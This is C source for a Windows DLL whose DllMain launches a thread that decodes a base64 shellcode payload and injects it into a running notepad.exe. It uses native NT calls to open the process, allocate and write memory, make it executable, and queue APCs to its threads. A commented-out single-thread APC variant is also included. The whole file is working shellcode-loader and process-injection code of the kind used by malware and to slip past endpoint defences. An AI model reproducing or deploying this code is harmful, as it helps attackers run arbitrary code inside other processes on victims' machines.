#include "apc.h"
#include "decode.h"

int exec() {
	LPWSTR lpProcessName = L"notepad.exe";
	DWORD pid = 0;
	HANDLE hProcess;
	DWORD tid;
	HANDLE hThread;
	PVOID pAddress = NULL;
	SIZE_T sNumberOfBytesWritten = NULL;
	DWORD dwOldProtection = NULL;
	printf("\n");
	decodeFull();

	if (!InitNtFunctions()) { printf("Failed to resolve NT functions.\n"); return 1; }

	if (!GetProcessNative(lpProcessName, &pid)) {
		printf("Failed to get process handle/pid \n"); return;
	} else wprintf(L"[+] Process %s : pid %lu \n", lpProcessName, (unsigned long)pid);

	OBJECT_ATTRIBUTES objAttr = { 0 };
	CLIENT_ID clientId = { 0 };
	clientId.UniqueProcess = (HANDLE)(ULONG_PTR)pid;
	clientId.UniqueThread = 0;
	InitializeObjectAttributes(&objAttr, NULL, 0, NULL, NULL);
	NTSTATUS status = NtOpenProcess(&hProcess, PROCESS_QUERY_INFORMATION | PROCESS_SET_INFORMATION | PROCESS_VM_OPERATION
		| PROCESS_VM_READ | PROCESS_VM_WRITE | SYNCHRONIZE, &objAttr, &clientId);
	if (status != STATUS_SUCCESS || hProcess == NULL) { PRINTXD("NtOpenProcess", status); return; }

	status = NtAllocateVirtualMemory(hProcess, &pAddress, 0, &shellcode_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (status != STATUS_SUCCESS) {
		PRINTXD("NtAllocateVirtualMemory", status); NtClose(hProcess); return;
	} else printf("Memory At : 0x%p \n", pAddress);

	status = NtWriteVirtualMemory(hProcess, pAddress, base64_decoded, (int)shellcode_size, NULL);
	if (status != STATUS_SUCCESS) {
		PRINTXD("NtWriteVirtualMemory", status);
		NtFreeVirtualMemory(hProcess, &pAddress, &shellcode_size, MEM_RELEASE); NtClose(hProcess); return;
	}

	status = NtProtectVirtualMemory(hProcess, &pAddress, &shellcode_size, PAGE_EXECUTE_READ, &dwOldProtection);
	if (STATUS_SUCCESS != status) {
		PRINTXD("NtProtectVirtualMemory", status);
		NtFreeVirtualMemory(hProcess, &pAddress, &shellcode_size, MEM_RELEASE); NtClose(hProcess); return;
	}






	if (!(NativeShotgunAPC(pid, pAddress))) { printf("fail"); }



	// or single APCInjection version
	/*if (!GetThreadNative(pid, &tid)) {
		printf("Failed to get thread handle/tid"); return;
	} else printf("[+] Found Thread : tid %lu \n", (unsigned long)tid);
	clientId.UniqueProcess = (HANDLE)(ULONG_PTR)pid;
	clientId.UniqueThread = (HANDLE)(ULONG_PTR)tid;
	status = NtOpenThread(&hThread, THREAD_SET_CONTEXT |
		THREAD_QUERY_INFORMATION | SYNCHRONIZE, &objAttr, &clientId);
	if (status != STATUS_SUCCESS || hThread == NULL) { PRINTXD("NtOpenThread", status); return; }
	NtAPCinject(hThread, pAddress);
	Sleep(2000);*/





	NtClose(hProcess);
	// CloseHandle(hThread);
	printf(" end");
	return 0;
}



DWORD WINAPI LoaderThread(LPVOID lpParam) {
	exec(); return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved) {
	if (fdwReason == DLL_PROCESS_ATTACH) {
		CreateThread(NULL, 0, LoaderThread, NULL, 0, NULL);
	}
	return TRUE;
}


